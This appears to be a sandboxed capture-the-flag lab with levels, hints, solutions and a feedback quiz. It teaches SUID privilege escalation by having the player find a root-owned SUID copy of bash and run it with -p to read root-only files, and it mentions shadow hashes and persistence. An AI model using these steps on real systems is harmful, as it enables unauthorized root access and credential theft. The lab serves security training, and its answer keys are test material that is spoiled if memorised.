title: SUID Privilege Escalation — NovaTech Solutions
description: Discover and exploit a misconfigured SUID binary left by a careless sysadmin to escalate from a low-privilege account to root on a corporate backup server.
outcomes: Use nmap to identify an SSH service and confirm the target port.
Read a sysadmin note that reveals a misconfiguration left behind after a maintenance window.
Use find to enumerate SUID binaries and identify the suspicious non-standard one.
Exploit a SUID copy of bash with the -p flag to execute commands as root and read protected files.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Each level builds on the previous one. Do not skip ahead.
* If you get stuck, use the hints — or search for the technique online.
* This exercise is for educational purposes only. Only attack systems within your sandbox.

# Storyline

You are a junior penetration tester at SecureWave Ltd. Your current engagement is with **NovaTech Solutions**, a technology consultancy that provides managed IT services to mid-market clients. NovaTech has asked you to perform an internal privilege escalation assessment — they want to understand what an attacker could do if they already had a foothold inside their network.

The IT team has given you a low-privilege account: `trainee`, password `letmein123`. This account was created for onboarding interns and has no special privileges. The server you are targeting is NovaTech's backup management server — a host that stores configuration data, backup credentials, and logs from their client deployments.

Three weeks ago, during an emergency maintenance window, a senior sysadmin needed to perform some diagnostics on this server but found themselves locked out of the root account. In a moment of impatience, they copied the bash binary to a custom location, set the SUID bit on it, and used it to complete the emergency task. They left a note in the trainee account's home directory as a reminder to remove it. That note is still there. The binary is still there.

SUID stands for Set User ID. When set on an executable owned by root, any user who runs that executable has it run with root's effective user ID — regardless of their own permissions. For standard system binaries like `su`, `passwd`, and `sudo`, this is intentional and carefully controlled. For a full copy of bash, it is catastrophic: bash is a general-purpose shell that can run any command, and with SUID it runs those commands as root.

Your mission: connect to the server, find the note, locate the SUID binary, confirm it gives you root-level command execution, and use it to read the flag stored in root's home directory. This is one of the most common privilege escalation vectors found in real penetration tests. It combines a careless configuration decision with a failure to clean up.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.28.23** using your assigned credentials. Your target is the NovaTech backup server at **10.1.28.10** (SSH port 22).

You will log in to the target as:
- Username: **trainee**, Password: **letmein123**

Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
The target SSH service is running locally on port **2222**.

```
sshpass -p letmein123 ssh -o StrictHostKeyChecking=no -p 2222 trainee@127.0.0.1
```

Submit **start** to begin.

levels.title: Identify the SSH Service
levels.content:
Before connecting to the target, confirm the SSH port with an nmap version scan:

```
nmap -sV 10.1.28.10
```

Even when you know the protocol, confirming the exact port is good practice — administrators sometimes move SSH to reduce automated scan noise, and a full scan ensures nothing is missed.

Look at the nmap output and find the row for the SSH service. Note the port number.

**What port is SSH listening on?**
levels.solution:
```
$ nmap -sV 10.1.28.10
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH ...
```

SSH is on port **22**.

hints.title: How to scan for SSH
hints.content: Run nmap -sV 10.1.28.10. Look for 'ssh' in the SERVICE column — the port number is in the first column before /tcp.

hints.title: Default SSH port
hints.content: SSH uses port 22 by default. Unless the admin changed it, nmap shows 22/tcp open ssh.

levels.title: Read the Sysadmin Note
levels.content:
Log in to the target server as the `trainee` account:

```
sshpass -p 'letmein123' ssh -o StrictHostKeyChecking=no trainee@10.1.28.10
```

Once connected, list files in the home directory and read the note:

```
ls -la ~
cat ~/note.txt
```

The note describes a debug tool installed during a maintenance window. It names the exact directory where the binary was placed. Read carefully — this is the clue that guides your next steps.

**What directory path does the note say the debug shell was installed in?**
levels.solution:
```
$ cat ~/note.txt
NovaTech Systems - Maintenance Note
A debug shell has been installed at /usr/local/bin/ for troubleshooting.
Remember to remove it after the maintenance window. -- IT Operations
```

The note points to **/usr/local/bin/**.

hints.title: How to read the note
hints.content: Log in with sshpass -p 'letmein123' ssh trainee@10.1.28.10, then run: cat ~/note.txt. The note mentions the installation directory of the debug shell.

hints.title: What directory is used for local binaries?
hints.content: Linux uses /usr/local/bin/ for locally installed binaries not managed by the package manager. A sysadmin placing a custom binary would likely put it there.

hints.title: The directory path
hints.content: The note says the debug shell was installed at /usr/local/bin/ (include the trailing slash).

levels.title: Find the SUID Binary
levels.content:
Search the entire filesystem for files with the SUID bit set:

```
find / -perm -4000 -type f 2>/dev/null
```

Breaking this down:
- `-perm -4000` — matches files where the SUID bit (octal 4000) is set
- `-type f` — regular files only
- `2>/dev/null` — suppresses permission-denied errors

The output includes standard system binaries (`/usr/bin/sudo`, `/usr/bin/passwd`) — these are expected. Look for any SUID binary in `/usr/local/bin/` — the directory the note mentioned.

**What is the filename (not full path) of the suspicious SUID binary in /usr/local/bin/?**
levels.solution:
```
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/local/bin/suid-shell
```

The suspicious binary is **suid-shell** in `/usr/local/bin/`.

hints.title: How to find SUID binaries
hints.content: Use: find / -perm -4000 -type f 2>/dev/null. The -perm -4000 flag matches files with the SUID bit set. Most results in /usr/bin/ are normal — look for anything in /usr/local/bin/.

hints.title: How to identify the suspicious one
hints.content: Standard SUID binaries live in /usr/bin/ or /bin/. Anything in /usr/local/bin/ with SUID is unusual — the note told you to look there.

hints.title: The binary name
hints.content: The binary is named suid-shell, in /usr/local/bin/. Its name alone tells you exactly what the sysadmin configured.

levels.title: Confirm Root Execution
levels.content:
You found `/usr/local/bin/suid-shell` — a copy of bash owned by root with the SUID bit set.

On modern Linux, bash drops elevated privileges by default when it detects its effective UID differs from its real UID. The **`-p` flag** (privileged mode) disables this protection:

```
/usr/local/bin/suid-shell -p -c 'whoami'
```

The `-c 'whoami'` runs the command and exits. If the SUID is working correctly, `whoami` will return the file owner's name.

You can also verify with `id` for full UID information:

```
/usr/local/bin/suid-shell -p -c 'id'
```

**What does whoami return when run through /usr/local/bin/suid-shell -p?**
levels.solution:
```
$ /usr/local/bin/suid-shell -p -c 'whoami'
root
```

The binary runs as **root** — confirmed by the SUID bit and -p flag.

hints.title: Why use -p with bash?
hints.content: Bash drops SUID privileges by default as a security measure. The -p (privileged) flag prevents this and keeps the elevated effective UID from the SUID bit.

hints.title: How to confirm root access
hints.content: Run: /usr/local/bin/suid-shell -p -c 'whoami'. If the SUID is working, whoami outputs 'root' because the file is owned by root and has the SUID bit.

hints.title: Expected output
hints.content: The output is 'root' — confirming effective root UID via the SUID binary.

levels.title: Read the Root Flag
levels.content:
You have confirmed root-level code execution. The flag is at `/root/flag.txt` — mode `0400`, readable only by root. The `trainee` account cannot read it directly:

```
/usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'
```

In a real engagement, this access would also let you read `/etc/shadow` (password hashes), SSH private keys, database credentials from service configs, and install persistence mechanisms. One careless `chmod +s` command that was never cleaned up opened all of that.

**Submit the flag from /root/flag.txt.**

hints.title: How to read a file with the SUID shell
hints.content: Use: /usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'. Replace the whoami from the previous level with cat and the flag path.

hints.title: Where is the flag?
hints.content: The flag is at /root/flag.txt with mode 0400 (root read only). Use the SUID shell to bypass the permission check.

hints.title: Flag format
hints.content: The flag starts with WMG{ and ends with }.

levels.title: Read a Protected System File
levels.content:
Use your root access to examine the system's user configuration. Read the `/etc/passwd` entry for the `trainee` account:

```
/usr/local/bin/suid-shell -p -c 'grep trainee /etc/passwd'
```

The `/etc/passwd` format is: `username:x:UID:GID:comment:home_directory:shell`

The last field (after the final colon) is the user's default login shell — the program that runs when the user logs in.

In a real engagement you would use this root access to read `/etc/shadow` for password hashes, or examine service configuration files for credentials.

**What is the full path of the shell assigned to the trainee account in /etc/passwd?**
levels.solution:
```
$ /usr/local/bin/suid-shell -p -c 'grep trainee /etc/passwd'
trainee:x:1000:1000::/home/trainee:/bin/bash
```

The shell is **/bin/bash** — the last colon-separated field.

hints.title: How to read a specific passwd entry
hints.content: Run: /usr/local/bin/suid-shell -p -c 'grep trainee /etc/passwd'. This filters the passwd file for the trainee line.

hints.title: How to read the /etc/passwd format
hints.content: The /etc/passwd format is: username:x:UID:GID:comment:home:shell. Count the colons — the shell is the 7th field (after the 6th colon).

hints.title: The shell path
hints.content: The trainee account uses /bin/bash as its login shell. This is the default for user accounts on Ubuntu.

levels.title: Feedback
levels.instructions: Please answer these questions to help us improve this game.

questions.text: How difficult did you find this game?
Before this game, were you aware that SUID binaries could be exploited?

choices.text: Yes, I had exploited SUID binaries before
I had heard of SUID but not exploited it
No, this was completely new to me

questions.text: How clear were the level instructions?
What does the SUID bit do when set on a file owned by root?

choices.text: The file runs with root effective UID regardless of who executes it
Only root can execute the file
The file is hidden from non-root users
The file cannot be modified by non-root users

questions.text: What would you change or add to improve this game?
